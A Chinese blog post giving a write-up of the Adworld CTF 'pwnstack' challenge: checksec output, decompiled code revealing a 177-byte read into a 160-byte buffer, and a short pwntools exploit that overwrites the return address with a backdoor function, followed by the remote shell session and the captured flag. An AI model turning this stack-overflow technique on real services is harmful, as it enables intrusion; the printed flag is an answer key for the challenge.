---
title: 攻防世界-pwnstack题解
date: 2025-02-06 16:55:35
tags:
  - CTF
  - PWN
categories:
  - CTF
toc: true
style: |
  .post-content {
    font-family: "楷体", "STKaiti", serif;
    font-size: 18px;
  }
index_img: /images/bg2.png
#banner_img: /images/bg2.PNG
---


## 攻防世界-pwnstack题解

这是新博客的第一篇文章，感觉空荡荡的就当一次随笔

#### 一、简述

【题型】[PWN]()
【题目】`pwnstack`
【来源】[攻防世界](https://adworld.xctf.org.cn/challenges/list）
【思路】[栈溢出]()

#### 二、思路及过程

Step.1：先使用`checksec`和`file`了解有关这个文件的一些信息

```bash
# zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:27:17]
$ checksec pwn2
[*] '/Challenge/Adworld/pwnstack/pwn2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
# zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:30:13] C:1
$ file pwn2
pwn2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=62aa40d64871e142a32827b4e403772e72f67fba, not stripped

```

我们从中可以得知它是一个64位的ELF格式文件

Step.2：放入IDA Pro中进行分析

```c++
int __fastcall main(int argc, const char **argv, const char **envp)
{
  initsetbuf(argc, argv, envp);
  puts("this is pwn1,can you do that??");
  vuln();
  return 0;
}
```

在里面我们发现了一个非常可疑的`puts` 和`vuln` 函数，点进去看看

```
__int64 vuln()
{
  char buf[160]; // [rsp+0h] [rbp-A0h] BYREF

  memset(buf, 0, sizeof(buf));
  read(0, buf, 0xB1uLL);
  return 0LL;
}
```

在vuln函数中我们可以看到函数分配了一个大小为 160 字节的缓冲区 `buf`，然后使用 `read` 函数从标准输入（文件描述符 0）读取数据到这个缓冲区中。然而，`read` 函数被指示读取最多 0xB1（即 177）字节的数据，这比缓冲区 `buf` 能够容纳的多，从而导致了缓冲区溢出的风险。

Step.5：shift+F12查看字符串发现`/bin/sh`，进入发现后门函数，查看地址（ctr+x）发现为：`0x400762`

```c
LOAD:0000000000400238		0000001C	C	/lib64/ld-linux-x86-64.so.2
LOAD:00000000004003B9		0000000A	C	libc.so.6
LOAD:00000000004003C8		00000006	C	stdin
LOAD:00000000004003D3		00000007	C	stdout
LOAD:00000000004003DA		00000007	C	stderr
LOAD:00000000004003E1		00000007	C	system
LOAD:00000000004003E8		00000008	C	setvbuf
LOAD:00000000004003F0		00000012	C	__libc_start_main
LOAD:0000000000400402		0000000F	C	__gmon_start__
LOAD:0000000000400411		0000000C	C	GLIBC_2.2.5
.rodata:0000000000400838	00000008	C	/bin/sh
.rodata:0000000000400848	0000001F	C	this is pwn1,can you do that??
.eh_frame:000000000040091F	00000006	C	;*3$\"
```

Step.6：构造exp并caught到flag

```
from pwn import *
p=remote("Host",Port)
payload=b'a'*0xa8+p64(0x400762)
p.sendline(payload)
p.interactive()
```

在上面的exp代码中使用了`pwntools`库并连接到远程服务器，随后我们构造了一个长度为”0xa8“并用'a'去填充和类型为二进制数据的payload，并覆盖返回地址到`0x400762`并将返回地址转换为小端序的64位进行表示

```bash
zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:50:22]
$ python3 exp.py
[+] Opening connection to 61.147.171.105 on port 54428: Done
[*] Switching to interactive mode
this is pwn1,can you do that??
$ ls
bin
dev
flag
lib
lib32
lib64
pwn2
$ cat flag
cyberpeace{9d0526386a432e6fcf65858cd1ee804d}
```



<script src="https://giscus.app/client.js"
        data-repo="solkatt-cn/solkatt-cn.github.io"
        data-repo-id="R_kgDONzaTTQ"
        data-category="Announcements"
        data-category-id="DIC_kwDONzaTTc4Cpqn7"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="preferred_color_scheme"
        data-lang="zh-CN"
        crossorigin="anonymous"
        async>
</script>
